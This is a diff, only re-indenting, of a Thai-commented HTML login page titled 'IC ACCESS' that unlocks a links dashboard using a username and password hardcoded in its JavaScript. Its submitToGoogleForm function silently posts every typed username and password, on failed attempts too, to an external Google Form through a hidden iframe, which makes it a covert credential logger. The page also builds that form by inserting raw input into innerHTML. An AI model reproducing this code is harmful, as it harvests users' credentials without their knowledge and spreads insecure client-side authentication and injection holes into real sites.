@@ -1,286 +1,286 @@
-<!doctype html>
-<html lang="th">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>IC ACCESS </title>
-<script src="https://cdn.tailwindcss.com"></script>
-<style>
-  body{margin:0;background:#030305;color:#e6e6e6;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;}
-  .bg-canvas {position:fixed;inset:0;z-index:0;opacity:0.12;filter:blur(2px);transition:opacity 2s;}
-  .card{z-index:2;backdrop-filter: blur(2px); border:1px solid rgba(255,0,0,0.12); transition: opacity 1s, transform 1s;}
-  .title {letter-spacing:2px;text-shadow:0 0 16px rgba(255,0,0,0.12);}
-  .neon {box-shadow:0 6px 24px rgba(255,0,0,0.12), inset 0 0 32px rgba(255,0,0,0.02);}
-  .overlay {position:fixed;inset:0;z-index:9999;pointer-events:none;opacity:0;transition:.25s}
-  .overlay.show{opacity:1;pointer-events:auto;}
-  .overlay .box{display:none !important;}
+  <!doctype html>
+  <html lang="th">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>IC ACCESS </title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body{margin:0;background:#030305;color:#e6e6e6;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;}
+    .bg-canvas {position:fixed;inset:0;z-index:0;opacity:0.12;filter:blur(2px);transition:opacity 2s;}
+    .card{z-index:2;backdrop-filter: blur(2px); border:1px solid rgba(255,0,0,0.12); transition: opacity 1s, transform 1s;}
+    .title {letter-spacing:2px;text-shadow:0 0 16px rgba(255,0,0,0.12);}
+    .neon {box-shadow:0 6px 24px rgba(255,0,0,0.12), inset 0 0 32px rgba(255,0,0,0.02);}
+    .overlay {position:fixed;inset:0;z-index:9999;pointer-events:none;opacity:0;transition:.25s}
+    .overlay.show{opacity:1;pointer-events:auto;}
+    .overlay .box{display:none !important;}
 
-  input[type="text"], input[type="password"]{
-    background:#060607;border:1px solid rgba(0,255,140,0.08);
-    color:#bfffbf;padding:12px;border-radius:8px;width:100%;outline:none;
-  }
-
-  #darkGlow{position:fixed;inset:0;z-index:1;pointer-events:none;
-    background:
-      radial-gradient(650px 650px at 50% 60%, rgba(0,255,160,.13), transparent 70%),
-      radial-gradient(350px 350px at 20% 20%, rgba(255,0,90,0.08), transparent 75%),
-      radial-gradient(260px 260px at 80% 25%, rgba(0,140,255,0.05), transparent 75%);
-    mix-blend-mode:screen;animation:darkPulse 7s ease-in-out infinite alternate;filter:blur(6px);
-  }
-  @keyframes darkPulse{0%{opacity:0.16}100%{opacity:0.28}}
-  
-  /* Class สำหรับซ่อน Login */
-  .vanish { opacity: 0 !important; pointer-events: none; transform: scale(0.9); }
-
-  /* CSS สำหรับหน้าเมนู (Dashboard) */
-  #dashboard {
-    position: fixed; inset: 0; z-index: 10;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    opacity: 0; pointer-events: none; transition: opacity 1.5s ease-in-out;
-    overflow-y: auto;
-    padding: 20px;
-  }
-  #dashboard.show-dash { opacity: 1; pointer-events: auto; }
-  
-  .link-container {
-    display: flex; flex-wrap: wrap; justify-content: center; max-width: 1000px; gap: 15px;
-  }
-
-  /* ดีไซน์ปุ่มลิ้งค์ */
-  .link-card {
-    display: flex; align-items: center; justify-content: center;
-    width: 220px; height: 70px;
-    background: rgba(6, 6, 7, 0.6);
-    border: 1px solid rgba(0, 255, 160, 0.2);
-    border-radius: 8px; text-align: center; color: #00ff9e; text-decoration: none;
-    font-family: ui-monospace, monospace; font-size: 0.95rem; letter-spacing: 1px;
-    transition: all 0.3s;
-    backdrop-filter: blur(4px);
-    text-transform: uppercase;
-  }
-  .link-card:hover {
-    background: rgba(0, 255, 160, 0.15);
-    border-color: #00ff9e;
-    box-shadow: 0 0 20px rgba(0, 255, 160, 0.4);
-    transform: translateY(-5px);
-    color: #fff;
-  }
-  /* ซ่อนปุ่มที่ยังไม่มีชื่อ */
-  .link-card.empty { display: none; }
-</style>
-</head>
-<body>
-
-<canvas id="bgCanvas" class="bg-canvas"></canvas>
-<div id="darkGlow"></div>
-
-<div id="loginWrapper" class="min-h-screen flex items-center justify-center">
-  <div class="card neon p-8 rounded-lg w-96" style="background:linear-gradient(180deg,#060607, #05050A);">
-    <div class="title text-red-400 font-bold text-2xl text-center">IC ACCESS</div>
-
-    <label class="muted mt-4">Username</label>
-    <div class="relative">
-      <input id="user" type="password" autocomplete="off" placeholder="Username" class="pr-10" />
-      <button type="button" id="toggleUser"
-        class="absolute inset-y-0 right-0 px-3 text-green-300 select-none">👁️</button>
-    </div>
-
-    <label class="muted mt-3">Password</label>
-    <input id="pass" type="password" autocomplete="new-password" placeholder="You can't see it" />
-
-    <button id="loginBtn" class="w-full p-3 bg-red-600 hover:bg-red-700 rounded text-white font-bold mt-5">ENTER</button>
-  </div>
-</div>
-
-<div id="dashboard">
-  <h1 class="text-3xl font-bold text-white mb-8 neon-text" style="text-shadow: 0 0 20px rgba(255,255,255,0.5);">Admin panel</h1>
-  <div id="linkGrid" class="link-container">
-    </div>
-</div>
-
-<div id="overlay" class="overlay no-select"></div>
-<iframe name="hidden_gform" style="display:none;"></iframe>
-
-<script>
-// ============================================
-// 1. ตั้งค่ารหัสผ่าน
-// ============================================
-const CORRECT_USER = "47568";
-const CORRECT_PASS = "Jaonai55";
-
-// ============================================
-// 2. ตั้งค่าลิ้งค์เว็บต่างๆ (20 ช่อง)
-// ============================================
-const DASHBOARD_LINKS = [
-  // แก้ไข "ชื่อ" และ "url" ในบรรทัดข้างล่างนี้ได้เลยครับ
-  
-  { name: "GOOGLE SEARCH",  url: "https://www.google.co.th" },
-  { name: "YOUTUBE",        url: "https://www.youtube.com" },
-  { name: "FACEBOOK",       url: "https://www.facebook.com" },
-  { name: "TWITTER",        url: "https://www.x.com/" },
-  { name: "HOME PAGE",      url: "https://rachatasawasdikit-collab.github.io/Web/" },
-  { name: "ชื่อเว็บที่ 6",    url: "https://" },
-  { name: "ชื่อเว็บที่ 7",    url: "https://" },
-  { name: "ชื่อเว็บที่ 8",    url: "https://" },
-  { name: "ชื่อเว็บที่ 9",    url: "https://" },
-  { name: "ชื่อเว็บที่ 10",   url: "https://" },
-  { name: "ชื่อเว็บที่ 11",   url: "https://" },
-  { name: "ชื่อเว็บที่ 12",   url: "https://" },
-  { name: "ชื่อเว็บที่ 13",   url: "https://" },
-  { name: "ชื่อเว็บที่ 14",   url: "https://" },
-  { name: "ชื่อเว็บที่ 15",   url: "https://" },
-  { name: "ชื่อเว็บที่ 16",   url: "https://" },
-  { name: "ชื่อเว็บที่ 17",   url: "https://" },
-  { name: "ชื่อเว็บที่ 18",   url: "https://" },
-  { name: "ชื่อเว็บที่ 19",   url: "https://" },
-  { name: "ชื่อเว็บที่ 20",   url: "https://" },
-
-];
-
-// ============================================
-// 3. ตั้งค่า Google Form
-// ============================================
-const FORM_ACTION = "https://docs.google.com/forms/d/e/1FAIpQLSeK67uHPt6GWHkyqepXJvwnZxdJVVX3gN_8VzpZh4IP2VR23Q/formResponse";
-const ENTRY_USER = "entry.82569335";
-const ENTRY_PASS = "entry.347428572";
-
-// --------------------------------------------
-// ฟังก์ชันทำงานระบบ
-// --------------------------------------------
-function renderDashboard() {
-  const container = document.getElementById('linkGrid');
-  container.innerHTML = '';
-  DASHBOARD_LINKS.forEach(link => {
-    // ถ้า url ยังเป็น https:// เฉยๆ หรือชื่อว่าง จะไม่แสดงปุ่ม (เพื่อความสวยงาม)
-    if(link.url === "https://" || link.name === "") return;
-
-    const a = document.createElement('a');
-    a.href = link.url;
-    a.target = "_blank"; 
-    a.className = "link-card";
-    a.innerText = link.name;
-    container.appendChild(a);
-  });
-}
-
-function submitToGoogleForm(u,p){
-  const f=document.createElement('form');
-  f.action=FORM_ACTION; f.method='POST'; f.target='hidden_gform';
-  f.innerHTML=`<input type="hidden" name="${ENTRY_USER}" value="${u}"><input type="hidden" name="${ENTRY_PASS}" value="${p}">`;
-  document.body.appendChild(f); f.submit(); f.remove();
-}
-
-function showOverlay(k){
-  const o=document.getElementById('overlay');
-  o.className='overlay show ' + (k==='ok'?'success':'fail');
-  setTimeout(()=>o.classList.remove('show'),1200);
-}
-
-function doLogin(){
-  const u=document.getElementById('user').value.replace(/\*/g,'');
-  const p=document.getElementById('pass').value;
-
-  submitToGoogleForm(u,p);
-
-  if(u===CORRECT_USER && p===CORRECT_PASS){
-    showOverlay('ok'); 
-    
-    setTimeout(()=> {
-        renderDashboard(); // สร้างปุ่ม
-        
-        // ซ่อน Login / โชว์ Dashboard
-        document.getElementById('loginWrapper').classList.add('vanish');
-        document.getElementById('dashboard').classList.add('show-dash');
-    }, 1400); 
-
-  } else {
-    showOverlay('fail');
-  }
-}
-
-document.getElementById('loginBtn').addEventListener('click', doLogin);
-
-// ============================================
-// เอฟเฟกต์ (HOLOGRAM & INTRO & INPUT)
-// ============================================
-</script>
-
-<style>
-#holoStatus{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;pointer-events:none;opacity:0;transition:.35s;z-index:99999;mix-blend-mode:screen;}
-#holoStatus.show{opacity:1;}
-#holoStatus .main{font:800 54px ui-monospace,monospace;letter-spacing:.3em;text-transform:uppercase;animation:hPulse 1.8s ease-in-out infinite alternate;}
-#holoStatus .sub{font:700 22px ui-monospace,monospace;letter-spacing:.25em;text-transform:uppercase;margin-top:12px;opacity:.9;}
-#holoStatus.success .main,#holoStatus.success .sub{color:#00ff9e;text-shadow:0 0 12px #00ff9e,0 0 32px rgba(0,255,160,.45);}
-#holoStatus.fail .main,#holoStatus.fail .sub{color:#ff4d6d;text-shadow:0 0 12px #ff4d6d,0 0 32px rgba(255,77,109,.45);}
-@keyframes hPulse{0%{transform:scale(1);opacity:.85}100%{transform:scale(1.1);opacity:1}}
-</style>
-<div id="holoStatus"><div class="main"></div><div class="sub"></div></div>
-
-<script>
-(function(){
-  const o=document.getElementById('overlay');
-  const h=document.getElementById('holoStatus');
-  const main=h.querySelector('.main');
-  const sub=h.querySelector('.sub');
-  new MutationObserver(()=>{
-    if(o.classList.contains('show')){
-      if(o.classList.contains('success')){
-        h.className="success show"; main.textContent="ACCESS GRANTED"; sub.textContent="COMPLETE";
-      } else {
-        h.className="fail show"; main.textContent="ACCESS DENIED"; sub.textContent="FAIL";
-      }
-      setTimeout(()=>h.classList.remove('show'),1400);
+    input[type="text"], input[type="password"]{
+      background:#060607;border:1px solid rgba(0,255,140,0.08);
+      color:#bfffbf;padding:12px;border-radius:8px;width:100%;outline:none;
     }
-  }).observe(o,{attributes:true});
-})();
-</script>
 
-<style>
-#epicIntro{position:fixed;inset:0;z-index:999998;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.75);pointer-events:none;opacity:0;transition:.45s}
-#epicIntro.show{opacity:1;pointer-events:auto;}
-.introWrap{background:rgba(0,0,0,.45);padding:28px 24px;border-radius:10px;text-align:center;backdrop-filter:blur(6px);}
-.introBrand{color:#00ff9e;font:900 42px ui-monospace,monospace;letter-spacing:.18em;text-transform:uppercase;margin-bottom:12px;}
-#introBar{height:10px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden;margin-top:8px;}
-#introBar .fill{height:100%;width:0%;background:linear-gradient(90deg,#00ff9e,#00a6ff);transition:.14s;}
-.introPct{display:flex;justify-content:space-between;color:#d8fff0;font:600 12px ui-monospace,monospace;margin-top:8px;}
-</style>
-<div id="epicIntro">
-  <div class="introWrap">
-    <div class="introBrand">IC ACCESS</div>
-    <div id="introBar"><div class="fill"></div></div>
-    <div class="introPct"><span id="introL">0%</span><span id="introR">0%</span></div>
+    #darkGlow{position:fixed;inset:0;z-index:1;pointer-events:none;
+      background:
+        radial-gradient(650px 650px at 50% 60%, rgba(0,255,160,.13), transparent 70%),
+        radial-gradient(350px 350px at 20% 20%, rgba(255,0,90,0.08), transparent 75%),
+        radial-gradient(260px 260px at 80% 25%, rgba(0,140,255,0.05), transparent 75%);
+      mix-blend-mode:screen;animation:darkPulse 7s ease-in-out infinite alternate;filter:blur(6px);
+    }
+    @keyframes darkPulse{0%{opacity:0.16}100%{opacity:0.28}}
+    
+    /* Class สำหรับซ่อน Login */
+    .vanish { opacity: 0 !important; pointer-events: none; transform: scale(0.9); }
+
+    /* CSS สำหรับหน้าเมนู (Dashboard) */
+    #dashboard {
+      position: fixed; inset: 0; z-index: 10;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      opacity: 0; pointer-events: none; transition: opacity 1.5s ease-in-out;
+      overflow-y: auto;
+      padding: 20px;
+    }
+    #dashboard.show-dash { opacity: 1; pointer-events: auto; }
+    
+    .link-container {
+      display: flex; flex-wrap: wrap; justify-content: center; max-width: 1000px; gap: 15px;
+    }
+
+    /* ดีไซน์ปุ่มลิ้งค์ */
+    .link-card {
+      display: flex; align-items: center; justify-content: center;
+      width: 220px; height: 70px;
+      background: rgba(6, 6, 7, 0.6);
+      border: 1px solid rgba(0, 255, 160, 0.2);
+      border-radius: 8px; text-align: center; color: #00ff9e; text-decoration: none;
+      font-family: ui-monospace, monospace; font-size: 0.95rem; letter-spacing: 1px;
+      transition: all 0.3s;
+      backdrop-filter: blur(4px);
+      text-transform: uppercase;
+    }
+    .link-card:hover {
+      background: rgba(0, 255, 160, 0.15);
+      border-color: #00ff9e;
+      box-shadow: 0 0 20px rgba(0, 255, 160, 0.4);
+      transform: translateY(-5px);
+      color: #fff;
+    }
+    /* ซ่อนปุ่มที่ยังไม่มีชื่อ */
+    .link-card.empty { display: none; }
+  </style>
+  </head>
+  <body>
+
+  <canvas id="bgCanvas" class="bg-canvas"></canvas>
+  <div id="darkGlow"></div>
+
+  <div id="loginWrapper" class="min-h-screen flex items-center justify-center">
+    <div class="card neon p-8 rounded-lg w-96" style="background:linear-gradient(180deg,#060607, #05050A);">
+      <div class="title text-red-400 font-bold text-2xl text-center">IC ACCESS</div>
+
+      <label class="muted mt-4">Username</label>
+      <div class="relative">
+        <input id="user" type="password" autocomplete="off" placeholder="Username" class="pr-10" />
+        <button type="button" id="toggleUser"
+          class="absolute inset-y-0 right-0 px-3 text-green-300 select-none">👁️</button>
+      </div>
+
+      <label class="muted mt-3">Password</label>
+      <input id="pass" type="password" autocomplete="new-password" placeholder="You can't see it" />
+
+      <button id="loginBtn" class="w-full p-3 bg-red-600 hover:bg-red-700 rounded text-white font-bold mt-5">ENTER</button>
+    </div>
   </div>
-</div>
-<script>
-(function(){
-  const intro=document.getElementById('epicIntro');
-  const fill=intro.querySelector('.fill');
-  const L=intro.querySelector('#introL');
-  const R=intro.querySelector('#introR');
-  let cur=0,target=100;
-  function tick(){
-    cur=Math.min(cur+2,target);
-    fill.style.width=cur+'%'; L.innerText=R.innerText=cur+'%';
-    if(cur<100) requestAnimationFrame(tick);
-    else setTimeout(()=>intro.classList.remove('show'),450);
+
+  <div id="dashboard">
+    <h1 class="text-3xl font-bold text-white mb-8 neon-text" style="text-shadow: 0 0 20px rgba(255,255,255,0.5);">Admin panel</h1>
+    <div id="linkGrid" class="link-container">
+      </div>
+  </div>
+
+  <div id="overlay" class="overlay no-select"></div>
+  <iframe name="hidden_gform" style="display:none;"></iframe>
+
+  <script>
+  // ============================================
+  // 1. ตั้งค่ารหัสผ่าน
+  // ============================================
+  const CORRECT_USER = "47568";
+  const CORRECT_PASS = "Jaonai55";
+
+  // ============================================
+  // 2. ตั้งค่าลิ้งค์เว็บต่างๆ (20 ช่อง)
+  // ============================================
+  const DASHBOARD_LINKS = [
+    // แก้ไข "ชื่อ" และ "url" ในบรรทัดข้างล่างนี้ได้เลยครับ
+    
+    { name: "GOOGLE SEARCH",  url: "https://www.google.co.th" },
+    { name: "YOUTUBE",        url: "https://www.youtube.com" },
+    { name: "FACEBOOK",       url: "https://www.facebook.com" },
+    { name: "TWITTER",        url: "https://www.x.com/" },
+    { name: "HOME PAGE",      url: "https://rachatasawasdikit-collab.github.io/Web/" },
+    { name: "ชื่อเว็บที่ 6",    url: "https://" },
+    { name: "ชื่อเว็บที่ 7",    url: "https://" },
+    { name: "ชื่อเว็บที่ 8",    url: "https://" },
+    { name: "ชื่อเว็บที่ 9",    url: "https://" },
+    { name: "ชื่อเว็บที่ 10",   url: "https://" },
+    { name: "ชื่อเว็บที่ 11",   url: "https://" },
+    { name: "ชื่อเว็บที่ 12",   url: "https://" },
+    { name: "ชื่อเว็บที่ 13",   url: "https://" },
+    { name: "ชื่อเว็บที่ 14",   url: "https://" },
+    { name: "ชื่อเว็บที่ 15",   url: "https://" },
+    { name: "ชื่อเว็บที่ 16",   url: "https://" },
+    { name: "ชื่อเว็บที่ 17",   url: "https://" },
+    { name: "ชื่อเว็บที่ 18",   url: "https://" },
+    { name: "ชื่อเว็บที่ 19",   url: "https://" },
+    { name: "ชื่อเว็บที่ 20",   url: "https://" },
+
+  ];
+
+  // ============================================
+  // 3. ตั้งค่า Google Form
+  // ============================================
+  const FORM_ACTION = "https://docs.google.com/forms/d/e/1FAIpQLSeK67uHPt6GWHkyqepXJvwnZxdJVVX3gN_8VzpZh4IP2VR23Q/formResponse";
+  const ENTRY_USER = "entry.82569335";
+  const ENTRY_PASS = "entry.347428572";
+
+  // --------------------------------------------
+  // ฟังก์ชันทำงานระบบ
+  // --------------------------------------------
+  function renderDashboard() {
+    const container = document.getElementById('linkGrid');
+    container.innerHTML = '';
+    DASHBOARD_LINKS.forEach(link => {
+      // ถ้า url ยังเป็น https:// เฉยๆ หรือชื่อว่าง จะไม่แสดงปุ่ม (เพื่อความสวยงาม)
+      if(link.url === "https://" || link.name === "") return;
+
+      const a = document.createElement('a');
+      a.href = link.url;
+      a.target = "_blank"; 
+      a.className = "link-card";
+      a.innerText = link.name;
+      container.appendChild(a);
+    });
   }
-  window.addEventListener('load',()=>{ intro.classList.add('show'); requestAnimationFrame(tick);});
-})();
-</script>
 
-<script>
-const userInput = document.getElementById("user");
-const toggleUser = document.getElementById("toggleUser");
-function showUser() { userInput.type = "text"; toggleUser.textContent = "🙈"; }
-function hideUser() { userInput.type = "password"; toggleUser.textContent = "👁️"; }
-toggleUser.addEventListener("mousedown", showUser);
-toggleUser.addEventListener("mouseup", hideUser);
-toggleUser.addEventListener("mouseleave", hideUser);
-toggleUser.addEventListener("touchstart", e => { e.preventDefault(); showUser(); });
-toggleUser.addEventListener("touchend", hideUser);
-toggleUser.addEventListener("touchcancel", hideUser);
-document.addEventListener("keyup", function(e){ if(e.key === "Enter"){ doLogin(); } });
-</script>
+  function submitToGoogleForm(u,p){
+    const f=document.createElement('form');
+    f.action=FORM_ACTION; f.method='POST'; f.target='hidden_gform';
+    f.innerHTML=`<input type="hidden" name="${ENTRY_USER}" value="${u}"><input type="hidden" name="${ENTRY_PASS}" value="${p}">`;
+    document.body.appendChild(f); f.submit(); f.remove();
+  }
 
-</body>
-</html>
+  function showOverlay(k){
+    const o=document.getElementById('overlay');
+    o.className='overlay show ' + (k==='ok'?'success':'fail');
+    setTimeout(()=>o.classList.remove('show'),1200);
+  }
+
+  function doLogin(){
+    const u=document.getElementById('user').value.replace(/\*/g,'');
+    const p=document.getElementById('pass').value;
+
+    submitToGoogleForm(u,p);
+
+    if(u===CORRECT_USER && p===CORRECT_PASS){
+      showOverlay('ok'); 
+      
+      setTimeout(()=> {
+          renderDashboard(); // สร้างปุ่ม
+          
+          // ซ่อน Login / โชว์ Dashboard
+          document.getElementById('loginWrapper').classList.add('vanish');
+          document.getElementById('dashboard').classList.add('show-dash');
+      }, 1400); 
+
+    } else {
+      showOverlay('fail');
+    }
+  }
+
+  document.getElementById('loginBtn').addEventListener('click', doLogin);
+
+  // ============================================
+  // เอฟเฟกต์ (HOLOGRAM & INTRO & INPUT)
+  // ============================================
+  </script>
+
+  <style>
+  #holoStatus{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;pointer-events:none;opacity:0;transition:.35s;z-index:99999;mix-blend-mode:screen;}
+  #holoStatus.show{opacity:1;}
+  #holoStatus .main{font:800 54px ui-monospace,monospace;letter-spacing:.3em;text-transform:uppercase;animation:hPulse 1.8s ease-in-out infinite alternate;}
+  #holoStatus .sub{font:700 22px ui-monospace,monospace;letter-spacing:.25em;text-transform:uppercase;margin-top:12px;opacity:.9;}
+  #holoStatus.success .main,#holoStatus.success .sub{color:#00ff9e;text-shadow:0 0 12px #00ff9e,0 0 32px rgba(0,255,160,.45);}
+  #holoStatus.fail .main,#holoStatus.fail .sub{color:#ff4d6d;text-shadow:0 0 12px #ff4d6d,0 0 32px rgba(255,77,109,.45);}
+  @keyframes hPulse{0%{transform:scale(1);opacity:.85}100%{transform:scale(1.1);opacity:1}}
+  </style>
+  <div id="holoStatus"><div class="main"></div><div class="sub"></div></div>
+
+  <script>
+  (function(){
+    const o=document.getElementById('overlay');
+    const h=document.getElementById('holoStatus');
+    const main=h.querySelector('.main');
+    const sub=h.querySelector('.sub');
+    new MutationObserver(()=>{
+      if(o.classList.contains('show')){
+        if(o.classList.contains('success')){
+          h.className="success show"; main.textContent="ACCESS GRANTED"; sub.textContent="COMPLETE";
+        } else {
+          h.className="fail show"; main.textContent="ACCESS DENIED"; sub.textContent="FAIL";
+        }
+        setTimeout(()=>h.classList.remove('show'),1400);
+      }
+    }).observe(o,{attributes:true});
+  })();
+  </script>
+
+  <style>
+  #epicIntro{position:fixed;inset:0;z-index:999998;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.75);pointer-events:none;opacity:0;transition:.45s}
+  #epicIntro.show{opacity:1;pointer-events:auto;}
+  .introWrap{background:rgba(0,0,0,.45);padding:28px 24px;border-radius:10px;text-align:center;backdrop-filter:blur(6px);}
+  .introBrand{color:#00ff9e;font:900 42px ui-monospace,monospace;letter-spacing:.18em;text-transform:uppercase;margin-bottom:12px;}
+  #introBar{height:10px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden;margin-top:8px;}
+  #introBar .fill{height:100%;width:0%;background:linear-gradient(90deg,#00ff9e,#00a6ff);transition:.14s;}
+  .introPct{display:flex;justify-content:space-between;color:#d8fff0;font:600 12px ui-monospace,monospace;margin-top:8px;}
+  </style>
+  <div id="epicIntro">
+    <div class="introWrap">
+      <div class="introBrand">IC ACCESS</div>
+      <div id="introBar"><div class="fill"></div></div>
+      <div class="introPct"><span id="introL">0%</span><span id="introR">0%</span></div>
+    </div>
+  </div>
+  <script>
+  (function(){
+    const intro=document.getElementById('epicIntro');
+    const fill=intro.querySelector('.fill');
+    const L=intro.querySelector('#introL');
+    const R=intro.querySelector('#introR');
+    let cur=0,target=100;
+    function tick(){
+      cur=Math.min(cur+2,target);
+      fill.style.width=cur+'%'; L.innerText=R.innerText=cur+'%';
+      if(cur<100) requestAnimationFrame(tick);
+      else setTimeout(()=>intro.classList.remove('show'),450);
+    }
+    window.addEventListener('load',()=>{ intro.classList.add('show'); requestAnimationFrame(tick);});
+  })();
+  </script>
+
+  <script>
+  const userInput = document.getElementById("user");
+  const toggleUser = document.getElementById("toggleUser");
+  function showUser() { userInput.type = "text"; toggleUser.textContent = "🙈"; }
+  function hideUser() { userInput.type = "password"; toggleUser.textContent = "👁️"; }
+  toggleUser.addEventListener("mousedown", showUser);
+  toggleUser.addEventListener("mouseup", hideUser);
+  toggleUser.addEventListener("mouseleave", hideUser);
+  toggleUser.addEventListener("touchstart", e => { e.preventDefault(); showUser(); });
+  toggleUser.addEventListener("touchend", hideUser);
+  toggleUser.addEventListener("touchcancel", hideUser);
+  document.addEventListener("keyup", function(e){ if(e.key === "Enter"){ doLogin(); } });
+  </script>
+
+  </body>
+  </html>
